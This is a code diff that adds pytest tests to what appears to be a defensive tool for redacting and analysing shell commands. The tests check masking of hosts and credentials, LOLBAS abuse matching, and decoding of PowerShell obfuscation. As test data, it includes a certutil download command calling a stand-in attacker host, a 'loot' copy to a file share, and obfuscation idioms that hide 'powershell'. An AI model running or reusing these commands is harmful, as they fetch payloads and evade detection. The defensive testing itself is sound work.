@@ -73,6 +73,128 @@ def test_redact_preserves_base64_blob():
     assert b64 in out
 
 
+# ── GAP 2: internal hostnames, broadened credentials, IPv6, PEM ──────────────
+
+def test_redact_internal_dns_hostname():
+    out, changed = redact("sqlcmd -S db01.corp.local -U sa")
+    assert changed
+    assert "db01.corp.local" not in out
+    assert "[INTERNAL-HOST]" in out
+
+
+def test_redact_unc_path_host():
+    out, changed = redact("copy loot.zip \\\\FILESRV01\\share")
+    assert changed
+    assert "FILESRV01" not in out
+    assert "[INTERNAL-HOST]" in out
+
+
+def test_redact_computername_flag():
+    out, changed = redact("Invoke-Command -ComputerName DC01 -ScriptBlock {hostname}")
+    assert changed
+    assert "DC01" not in out
+
+
+def test_redact_bearer_token():
+    out, changed = redact('curl -H "Authorization: Bearer eyJhbGciOiJIUzI1Niabc123" https://x')
+    assert changed
+    assert "eyJhbGciOiJIUzI1Niabc123" not in out
+
+
+def test_redact_aws_access_key():
+    out, changed = redact("aws configure set k AKIAIOSFODNN7EXAMPLE")
+    assert changed
+    assert "AKIAIOSFODNN7EXAMPLE" not in out
+
+
+def test_redact_securestring_plaintext():
+    out, changed = redact("ConvertTo-SecureString -String 'Pl4inT3xt!' -AsPlainText -Force")
+    assert changed
+    assert "Pl4inT3xt!" not in out
+
+
+def test_redact_ipv6_private():
+    out, changed = redact("ping fe80::1ff:fe23:4567:890a")
+    assert changed
+    assert "fe80::1ff:fe23:4567:890a" not in out
+    assert "[INTERNAL-IP]" in out
+
+
+def test_redact_pem_private_key():
+    cmd = "echo '-----BEGIN RSA PRIVATE KEY-----\nMIIabc123\n-----END RSA PRIVATE KEY-----'"
+    out, changed = redact(cmd)
+    assert changed
+    assert "MIIabc123" not in out
+    assert "[REDACTED-KEY]" in out
+
+
+def test_redact_public_domain_not_masked():
+    # A public TLD must NOT be treated as an internal host.
+    out, changed = redact("Invoke-WebRequest https://example.com/report.pdf")
+    assert not changed
+
+
+# ── GAP 1: LOLBAS argument similarity ─────────────────────────────────────────
+
+from app.lolbas import load_catalog as _load_lolbas, match as _lolbas_match
+
+_load_lolbas()
+
+
+def test_lolbas_abuse_pattern_matches_args():
+    # Textbook certutil download abuse — args should resemble a known example.
+    hit = _lolbas_match("certutil", "certutil -urlcache -split -f http://evil.example/x.exe x.exe")
+    assert hit is not None
+    assert hit.get("arg_match") is True
+    assert hit.get("arg_similarity", 0) >= 0.6
+
+
+def test_lolbas_benign_dualuse_does_not_match_args():
+    # Same binary, legitimate use — args should NOT resemble abuse examples.
+    hit = _lolbas_match("certutil", "certutil.exe -hashfile report.pdf SHA256")
+    assert hit is not None
+    assert hit.get("arg_match") is False
+
+
+# ── GAP 4: string-obfuscation decoders ────────────────────────────────────────
+
+from app.decoder import decode_layers as _decode
+
+
+def test_decode_string_concat():
+    layers = _decode("$x = 'po'+'wer'+'shell'+'.exe'")
+    encodings = [l["encoding"] for l in layers]
+    assert "string-concat" in encodings
+    assert any("powershell.exe" in l["value"] for l in layers)
+
+
+def test_decode_format_operator():
+    layers = _decode("Invoke-Expression ('{0}{1}{2}' -f 'po','wer','shell')")
+    encodings = [l["encoding"] for l in layers]
+    assert "format-op" in encodings
+    assert any("powershell" in l["value"] for l in layers)
+
+
+def test_decode_dot_replace():
+    layers = _decode("$cmd = 'p?o?w?e?r'.replace('?','')")
+    encodings = [l["encoding"] for l in layers]
+    assert "dot-replace" in encodings
+    assert any("power" in l["value"] for l in layers)
+
+
+def test_decode_array_reverse():
+    layers = _decode("[array]::Reverse([char[]]'llehsrewop')")
+    encodings = [l["encoding"] for l in layers]
+    assert "array-reverse" in encodings
+    assert any("powershell" in l["value"] for l in layers)
+
+
+def test_decode_two_string_literals_does_not_fire():
+    # Only 2 literals joined — too noisy to treat as obfuscation.
+    layers = _decode("$x = 'hello' + 'world'")
+    assert "string-concat" not in [l["encoding"] for l in layers]
+
+
 # ---------------------------------------------------------------------------
 # classifier
 # ---------------------------------------------------------------------------
